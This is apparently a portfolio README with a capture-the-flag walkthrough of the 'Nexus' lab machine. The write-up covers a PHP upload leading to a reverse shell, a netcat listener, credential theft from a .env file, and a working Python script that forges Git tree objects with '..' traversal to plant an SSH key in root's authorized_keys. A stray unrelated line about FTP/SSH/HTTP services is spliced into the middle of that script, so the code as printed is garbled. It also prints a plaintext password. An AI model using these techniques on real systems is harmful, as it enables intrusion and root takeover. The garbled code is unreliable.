# Offensive Security & Application Auditing Portfolio

This repository contains an advanced portfolio of technical security write-ups, deep-dive vulnerability assessments, and exploit development cases authored by **Héctor Marroquín** (Systems Engineer & Cybersecurity Specialist). Each case study thoroughly documents real-world attack chains, step-by-step intrusion methodologies, low-level binary/version-control mechanics, and enterprise-grade hardening guidelines.

---

## 🔬 Flagship Case Study: Nexus (Advanced Intrusion & Privilege Escalation Workflow)

The **Nexus** assessment represents a complete multi-tier compromise involving web application exploitation, credential harvesting, and low-level version control manipulation to achieve full root privileges via automated cron synchronization.

### Phase 1: Reconnaissance & Attack Surface Enumeration
* **Virtual Host Discovery:** Initial network mapping and enumeration of the target exposed two primary virtual subdomains:
  - `git.nexus.htb` (Hosting an internal Gitea instance for source code control).
  - `billing.nexus.htb` (Hosting Krayin CRM, handling business logic and file management modules).
* **Initial Code Access:** Utilizing preliminary credentials discovered during reconnaissance for the user `jones` (`y27xb3ha!!74GbR`), access was verified against the local Gitea repository (`http://git.nexus.htb/jones/rce.git`).

### Phase 2: Initial Access & Remote Code Execution (RCE)
* **File Upload Logic Flaw:** The Krayin CRM instance running on `billing.nexus.htb` featured a vulnerable TinyMCE file manager module within its public storage path.
* **Payload Execution:** A malicious PHP script disguised/uploaded via the file manager interface was successfully executed by the web server daemon.
* **Listener & Session Stabilization:**
  - A Netcat listener was established on the attacker's host:
    ```bash
    nc -lvnp 4444
    ```
  - Upon receiving the reverse shell as `www-data`, a fully interactive TTY session was spawned and stabilized:
    ```bash
    script /dev/null -c bash
    export TERM=xterm
    export SHELL=bash
    ```

### Phase 3: Lateral Movement & Credential Harvesting
* **Configuration File Analysis:** Navigating the application directory structure (`~/krayin`), the hidden environment configuration file `.env` was inspected:
  ```bash
  cat ~/krayin/.env
  ```
* **Credential Reuse Discovery:** The file revealed database credentials and configuration parameters, exposing the plain-text password for the system user `jones` (`y27xb3ha!!74GbR`), which was successfully leveraged for Gitea and potential system access.

### Phase 4: Privilege Escalation to Root (Git Object Manipulation & Cron Abuse)
* **SSH Key Generation:** A dedicated `ed25519` cryptographic key pair was generated on the attacking machine:
  ```bash
  ssh-keygen -t ed25519 -f /tmp/.k -N ""
  ```
* **Low-Level Git Crafting (`build.py`):** To exploit an automated template-sync cron job running under `root` privileges on the target, a custom Python script was engineered to construct raw Git loose objects (`blob` and `tree` objects). This mapped a custom directory tree directly to `/root/.ssh/authorized_keys` inside the version control database without triggering standard high-level checks:
  ```python
  #!/usr/bin/env python3
  import hashlib, zlib, os, subprocess, sys, time

  def write_obj(data, t):
      h = f"{t} {len(data)}".encode() + b"\x00"
      s = h + data
      sha = hashlib.sha1(s).hexdigest()
      d = os.path.join(".git", "objects", sha[:2])
      os.makedirs(d, exist_ok=True)
      p = os.path.join(d, sha[2:])
      if not os.path.exists(p):
          open(p, "wb").write(zlib.compress(s))
      return sha

  def entry(mode, name, sha):
      return f"{mode} {name}".encode() + b"\x00" + bytes.fromhex(sha)

  if not os.path.isdir(".git"):
      print("Run inside git repo")
      sys.exit(1)

  r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
  if r.returncode != 0:
      print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
      sys.exit(1)

  key = r.stdout.strip() + "\n"
  blob = write_obj(key.encode(), "blob")
  readme = write_obj(b"# Template\n", "blob")
* **Analyzed Services:** FTP (Port 21), SSH (Port 22), and HTTP (Port 80)[cite: 22].

  ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
  cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
  fir = write_obj(entry("40000", "root", cur), "tree")

  for i in range(4):
      fir = write_obj(entry("40000", "..", fir), "tree")

  root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
  ts = int(time.time())
  c = f"tree {root}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n"

  sha = write_obj(c.encode(), "commit")
  os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
  open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
  print("Done: " + sha)
  ```
* **Forced Push & Synchronization:** After executing the build script locally in the cloned repository, the modified commit tree was forcefully pushed:
  ```bash
  python3 build.py
  git push -u origin main --force
  ```
* **Root Shell Access:** Upon automated background execution of the synchronization script by `root`, the public key was written to the administrative authorized keys file, permitting direct administrative access:
  ```bash
  ssh -i /tmp/.k root@nexus.htb
  ```

---